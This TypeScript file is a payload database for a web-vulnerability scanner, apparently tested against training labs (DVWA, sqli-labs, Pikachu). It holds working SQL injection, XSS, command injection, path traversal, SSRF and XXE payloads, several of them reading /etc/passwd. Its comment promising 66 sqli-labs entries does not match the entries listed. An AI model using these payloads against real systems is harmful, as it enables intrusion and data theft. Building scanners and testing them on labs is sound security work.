export type InjectionType =
  | 'error_based_sqli'
  | 'blind_boolean_sqli'
  | 'blind_time_sqli'
  | 'stacked_query_sqli'
  | 'error_based_header_sqli'
  | 'cookie_sqli'
  | 'xss_reflected'
  | 'xss_stored'
  | 'rce'
  | 'lfi'
  | 'rfi'
  | 'csrf'
  | 'file_upload'
  | 'filter_bypass'
  | 'waf_bypass'
  | 'auth_bypass'
  | 'ssrf'
  | 'xxe';

export type ClosureType =
  | 'string'
  | 'numeric'
  | 'string_paren'
  | 'dquote_paren'
  | 'double_paren'
  | 'base64'
  | 'none';

export interface PayloadEntry {
  id: string;
  target: string;
  injectionType: InjectionType;
  closure: ClosureType;
  method: 'GET' | 'POST';
  url: string;
  body?: string;
  headers?: Record<string, string>;
  cookies?: Record<string, string>;
  noFollowRedirect?: boolean;
  payload: string;
  expected: Record<string, unknown>;
  verified: boolean;
  category: string;
}

export const PAYLOAD_DATABASE: PayloadEntry[] = [
  // === DVWA (21 entries) ===
  ...(['low', 'medium', 'high'] as const).flatMap((level) => [
    {
      id: `dvwa-sqli-${level}`,
      target: 'dvwa',
      injectionType: 'error_based_sqli' as InjectionType,
      closure: 'string' as ClosureType,
      method: 'GET' as const,
      url: `/vulnerabilities/sqli/?id=1%27+OR+1=1--+-&Submit=Submit`,
      payload: "1' OR 1=1-- -",
      expected: { matches: '/admin|First name/i' },
      verified: true,
      category: `DVWA ${level}`,
    },
    {
      id: `dvwa-blind-${level}`,
      target: 'dvwa',
      injectionType: 'blind_time_sqli' as InjectionType,
      closure: 'string' as ClosureType,
      method: 'GET' as const,
      url: `/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP(3)--+-&Submit=Submit`,
      payload: "1' AND SLEEP(3)-- -",
      expected: {
        timeDelayMs: 2500,
        baselineUrl: '/vulnerabilities/sqli_blind/?id=1&Submit=Submit',
      },
      verified: true,
      category: `DVWA ${level}`,
    },
    {
      id: `dvwa-xss-r-${level}`,
      target: 'dvwa',
      injectionType: 'xss_reflected' as InjectionType,
      closure: 'none' as ClosureType,
      method: 'GET' as const,
      url: `/vulnerabilities/xss_r/?name=<script>alert(1)</script>`,
      payload: '<script>alert(1)</script>',
      expected: { matches: '/<script>alert/i' },
      verified: true,
      category: `DVWA ${level}`,
    },
    {
      id: `dvwa-xss-s-${level}`,
      target: 'dvwa',
      injectionType: 'xss_stored' as InjectionType,
      closure: 'none' as ClosureType,
      method: 'POST' as const,
      url: `/vulnerabilities/xss_s/`,
      body: 'txtName=test&mtxMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook',
      payload: '<script>alert(1)</script>',
      expected: { matches: '/<script>alert/i' },
      verified: true,
      category: `DVWA ${level}`,
    },
    {
      id: `dvwa-rce-${level}`,
      target: 'dvwa',
      injectionType: 'rce' as InjectionType,
      closure: 'none' as ClosureType,
      method: 'POST' as const,
      url: `/vulnerabilities/exec/`,
      body: 'ip=127.0.0.1;id&Submit=Submit',
      payload: '127.0.0.1;id',
      expected: { matches: '/uid|root/i' },
      verified: true,
      category: `DVWA ${level}`,
    },
    {
      id: `dvwa-lfi-${level}`,
      target: 'dvwa',
      injectionType: 'lfi' as InjectionType,
      closure: 'none' as ClosureType,
      method: 'GET' as const,
      url: `/vulnerabilities/fi/?page=../../../../etc/passwd`,
      payload: '../../../../etc/passwd',
      expected: { matches: '/root:.*bin\\/bash/i' },
      verified: true,
      category: `DVWA ${level}`,
    },
    {
      id: `dvwa-upload-${level}`,
      target: 'dvwa',
      injectionType: 'file_upload' as InjectionType,
      closure: 'none' as ClosureType,
      method: 'GET' as const,
      url: `/vulnerabilities/upload/`,
      payload: 'file_upload_check',
      expected: { matches: '/upload/i' },
      verified: true,
      category: `DVWA ${level}`,
    },
  ]),

  // === sqli-labs (66 entries) — classified by injection type ===
  // GET Error-based (1-6)
  {
    id: 'Less-1',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-1/?id=1%27+OR+1=1--+-',
    payload: "1' OR 1=1-- -",
    expected: { matches: '/Dumb|Angelina|Slave/i' },
    verified: true,
    category: 'GET error',
  },
  {
    id: 'Less-2',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'numeric',
    method: 'GET',
    url: '/Less-2/?id=1+OR+1=1--+-',
    payload: '1 OR 1=1-- -',
    expected: { matches: '/Dumb|Angelina|Slave/i' },
    verified: true,
    category: 'GET error',
  },
  {
    id: 'Less-3',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string_paren',
    method: 'GET',
    url: '/Less-3/?id=1%27%29+OR+1=1--+-',
    payload: "1') OR 1=1-- -",
    expected: { matches: '/Dumb|Angelina|Slave/i' },
    verified: true,
    category: 'GET error',
  },
  {
    id: 'Less-4',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'dquote_paren',
    method: 'GET',
    url: '/Less-4/?id=1%22%29+OR+1=1--+-',
    payload: '1") OR 1=1-- -',
    expected: { matches: '/Dumb|Angelina|Slave/i' },
    verified: true,
    category: 'GET error',
  },
  {
    id: 'Less-5',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-5/?id=1%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--+-',
    payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
    expected: { matches: '/XPATH|5\\.[0-9]/i' },
    verified: true,
    category: 'GET error',
  },
  {
    id: 'Less-6',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-6/?id=1%22+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--+-',
    payload: '1" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -',
    expected: { matches: '/XPATH|5\\.[0-9]/i' },
    verified: true,
    category: 'GET error',
  },

  // GET Blind boolean/time (7-10)
  {
    id: 'Less-7',
    target: 'sqlilabs',
    injectionType: 'blind_boolean_sqli',
    closure: 'double_paren',
    method: 'GET',
    url: '/Less-7/?id=1%27%29%29+OR+1=1--+-',
    payload: "1')) OR 1=1-- -",
    expected: { contains: 'You are in' },
    verified: true,
    category: 'GET blind',
  },
  {
    id: 'Less-8',
    target: 'sqlilabs',
    injectionType: 'blind_boolean_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-8/?id=1%27+OR+1=1--+-',
    payload: "1' OR 1=1-- -",
    expected: { contains: 'You are in' },
    verified: true,
    category: 'GET blind',
  },
  {
    id: 'Less-9',
    target: 'sqlilabs',
    injectionType: 'blind_time_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-9/?id=1%27+AND+SLEEP(3)--+-',
    payload: "1' AND SLEEP(3)-- -",
    expected: { timeDelayMs: 2500, baselineUrl: '/Less-9/?id=1' },
    verified: true,
    category: 'GET blind',
  },
  {
    id: 'Less-10',
    target: 'sqlilabs',
    injectionType: 'blind_time_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-10/?id=1%22+AND+SLEEP(3)--+-',
    payload: '1" AND SLEEP(3)-- -',
    expected: { timeDelayMs: 2500, baselineUrl: '/Less-10/?id=1' },
    verified: true,
    category: 'GET blind',
  },

  // POST Error-based (11-14)
  {
    id: 'Less-11',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string',
    method: 'POST',
    url: '/Less-11/',
    body: 'uname=admin%27+OR+1=1--+-&passwd=x&submit=Submit',
    payload: "admin' OR 1=1-- -",
    expected: { matches: '/Your Login|Dumb|Slap/i' },
    verified: true,
    category: 'POST error',
  },
  {
    id: 'Less-12',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'dquote_paren',
    method: 'POST',
    url: '/Less-12/',
    body: 'uname=admin%22%29+OR+1=1--+-&passwd=x&submit=Submit',
    payload: 'admin") OR 1=1-- -',
    expected: { matches: '/Your Login|Dumb/i' },
    verified: true,
    category: 'POST error',
  },
  {
    id: 'Less-13',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string_paren',
    method: 'POST',
    url: '/Less-13/',
    body: 'uname=admin%27%29+OR+1=1--+-&passwd=x&submit=Submit',
    payload: "admin') OR 1=1-- -",
    expected: { matches: '/Dumb|error|syntax/i' },
    verified: true,
    category: 'POST error',
  },
  {
    id: 'Less-14',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'dquote_paren',
    method: 'POST',
    url: '/Less-14/',
    body: 'uname=admin%22%29+OR+1=1--+-&passwd=x&submit=Submit',
    payload: 'admin") OR 1=1-- -',
    expected: { matches: '/Dumb|error|syntax/i' },
    verified: true,
    category: 'POST error',
  },

  // POST Blind (15-17)
  {
    id: 'Less-15',
    target: 'sqlilabs',
    injectionType: 'blind_boolean_sqli',
    closure: 'string',
    method: 'POST',
    url: '/Less-15/',
    body: 'uname=admin%27+OR+1=1--+-&passwd=x&submit=Submit',
    payload: "admin' OR 1=1-- -",
    expected: { matches: '/slap|Your Login|Dumb/i' },
    verified: true,
    category: 'POST blind',
  },
  {
    id: 'Less-16',
    target: 'sqlilabs',
    injectionType: 'blind_boolean_sqli',
    closure: 'dquote_paren',
    method: 'POST',
    url: '/Less-16/',
    body: 'uname=admin%22%29+OR+1=1--+-&passwd=x&submit=Submit',
    payload: 'admin") OR 1=1-- -',
    expected: { matches: '/slap|Your Login|Dumb/i' },
    verified: true,
    category: 'POST blind',
  },
  {
    id: 'Less-17',
    target: 'sqlilabs',
    injectionType: 'error_based_sqli',
    closure: 'string',
    method: 'POST',
    url: '/Less-17/',
    body: 'uname=admin&passwd=xxx%27+OR+1=1--+-&submit=Submit',
    payload: "xxx' OR 1=1-- -",
    expected: { matches: '/successfully|error|slap/i' },
    verified: true,
    category: 'POST blind',
  },

  // Header injection (18-19)
  {
    id: 'Less-18',
    target: 'sqlilabs',
    injectionType: 'error_based_header_sqli',
    closure: 'string',
    method: 'POST',
    url: '/Less-18/',
    body: 'uname=admin&passwd=1&submit=Submit',
    headers: { 'User-Agent': "1' OR UPDATEXML(1,CONCAT(0x7e,version()),1) OR '1'='1" },
    payload: 'UPDATEXML via User-Agent header',
    expected: { matches: '/XPATH|5\\.[0-9]/i' },
    verified: true,
    category: 'Header injection',
  },
  {
    id: 'Less-19',
    target: 'sqlilabs',
    injectionType: 'error_based_header_sqli',
    closure: 'string',
    method: 'POST',
    url: '/Less-19/',
    body: 'uname=admin&passwd=1&submit=Submit',
    headers: { Referer: "1' OR UPDATEXML(1,CONCAT(0x7e,version()),1) OR '1'='1" },
    payload: 'UPDATEXML via Referer header',
    expected: { matches: '/XPATH|5\\.[0-9]/i' },
    verified: true,
    category: 'Header injection',
  },

  // Cookie injection (20-22)
  {
    id: 'Less-20',
    target: 'sqlilabs',
    injectionType: 'cookie_sqli',
    closure: 'string',
    method: 'GET',
    url: '/Less-20/',
    cookies: { uname: "admin' OR 1=1-- -" },
    payload: "admin' OR 1=1-- - via cookie",
    expected: { matches: '/Your Login|Dumb|error/i' },
    verified: true,
    category: 'Cookie injection',
  },
  {
    id: 'Less-21',
    target: 'sqlilabs',
    injectionType: 'cookie_sqli',
    closure: 'string_paren',
    method: 'GET',
    url: '/Less-21/',
    cookies: { uname: Buffer.from("admin') OR 1=1-- -").toString('base64') },
    payload: "base64(admin') OR 1=1-- -) via cookie",
    expected: { matches: '/Your Login|Dumb|error/i' },
    verified: true,
    category: 'Cookie injection',
  },
  {
    id: 'Less-22',
    target: 'sqlilabs',
    injectionType: 'cookie_sqli',
    closure: 'numeric',
    method: 'GET',
    url: '/Less-22/',
    cookies: { uname: Buffer.from('admin OR 1=1-- -').toString('base64') },
    payload: 'base64(admin OR 1=1-- -) via cookie',
    expected: { matches: '/Your Login|Dumb|error/i' },
    verified: true,
    category: 'Cookie injection',
  },

  // Filter bypass (23-28)
  {
    id: 'Less-23',
    target: 'sqlilabs',
    injectionType: 'filter_bypass',
    closure: 'string',
    method: 'GET',
    url: '/Less-23/?id=1%27+OR+1=1%3b%00',
    payload: "1' OR 1=1;%00",
    expected: { matches: '/Dumb|Angelina/i' },
    verified: true,
    category: 'Filter bypass',
  },
  {
    id: 'Less-25',
    target: 'sqlilabs',
    injectionType: 'filter_bypass',
    closure: 'string',
    method: 'GET',
    url: '/Less-25/?id=1%27+oorr+1=1--+-',
    payload: "1' oorr 1=1-- -",
    expected: { matches: '/Dumb|Angelina/i' },
    verified: true,
    category: 'Filter bypass',
  },
  {
    id: 'Less-28',
    target: 'sqlilabs',
    injectionType: 'filter_bypass',
    closure: 'string_paren',
    method: 'GET',
    url: '/Less-28/?id=1%27)%0boR%0b1=1;%00',
    payload: "1')%0boR%0b1=1;%00",
    expected: { matches: '/Dumb|error|syntax/i' },
    verified: true,
    category: 'Filter bypass',
  },

  // === Pikachu SSRF (3 entries) ===
  {
    id: 'pikachu-ssrf-curl-meta',
    target: 'pikachu',
    injectionType: 'ssrf',
    closure: 'none',
    method: 'GET',
    url: '/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/server-status',
    payload: 'http://127.0.0.1/server-status',
    expected: { matches: '/Apache|Server|Status|localhost/i' },
    verified: true,
    category: 'SSRF curl',
  },
  {
    id: 'pikachu-ssrf-curl-file',
    target: 'pikachu',
    injectionType: 'ssrf',
    closure: 'none',
    method: 'GET',
    url: '/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd',
    payload: 'file:///etc/passwd',
    expected: { matches: '/root:|\\/bin\\/bash|nobody/i' },
    verified: true,
    category: 'SSRF curl',
  },
  {
    id: 'pikachu-ssrf-fgc',
    target: 'pikachu',
    injectionType: 'ssrf',
    closure: 'none',
    method: 'GET',
    url: '/vul/ssrf/ssrf_fgc.php?file=/etc/passwd',
    payload: '/etc/passwd',
    expected: { matches: '/root:|\\/bin\\/bash|nobody/i' },
    verified: true,
    category: 'SSRF file_get_contents',
  },

  // === Pikachu XXE (1 entry) ===
  {
    id: 'pikachu-xxe-1',
    target: 'pikachu',
    injectionType: 'xxe',
    closure: 'none',
    method: 'POST',
    url: '/vul/xxe/xxe_1.php',
    body: 'xml=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C!DOCTYPE+foo+%5B%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2Ftest%3E&submit=%E6%8F%90%E4%BA%A4',
    payload: '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
    expected: { matches: '/root:|\\/bin\\/bash|nobody/i' },
    verified: true,
    category: 'XXE file disclosure',
  },
];

export function getPayloadsByType(type: InjectionType): PayloadEntry[] {
  return PAYLOAD_DATABASE.filter((p) => p.injectionType === type);
}

export function getPayloadsByTarget(target: string): PayloadEntry[] {
  return PAYLOAD_DATABASE.filter((p) => p.target === target);
}

export function getPayloadsByClosure(closure: ClosureType): PayloadEntry[] {
  return PAYLOAD_DATABASE.filter((p) => p.closure === closure);
}

export function getPayloadStats(): Record<string, number> {
  const stats: Record<string, number> = {};
  for (const p of PAYLOAD_DATABASE) {
    stats[p.injectionType] = (stats[p.injectionType] || 0) + 1;
  }
  return stats;
}
